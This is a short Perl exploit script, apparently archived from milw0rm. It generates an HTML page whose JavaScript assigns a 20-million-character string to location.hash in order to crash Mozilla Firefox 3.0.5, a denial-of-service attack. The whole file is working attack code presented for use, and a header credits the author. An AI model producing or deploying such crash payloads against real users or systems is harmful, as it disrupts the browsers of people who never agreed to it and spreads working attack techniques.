#!/usr/bin/perl
# mzff_lhash_dos.pl
# Mozilla Firefox 3.0.5 location.hash Denial of Service Exploit
# Jeremy Brown [0xjbrown41@gmail.com/jbrownsec.blogspot.com]
# Crash on Vista, play with it on XP

$filename = $ARGV[0];
if(!defined($filename))
{

     print "Usage: $0 <filename.html>\n\n";

}

$head = "<html>" . "\n" . "<script type=\"text/javascript\">" . "\n";
$trig = "location.hash = \"" . "A" x 20000000 . "\";" . "\n";
$foot = "</script>" . "\n" . "</html>";

$data = $head . $trig . $foot;

     open(FILE, '>' . $filename);
     print FILE $data;
     close(FILE);

exit;

# milw0rm.com [2008-12-23]
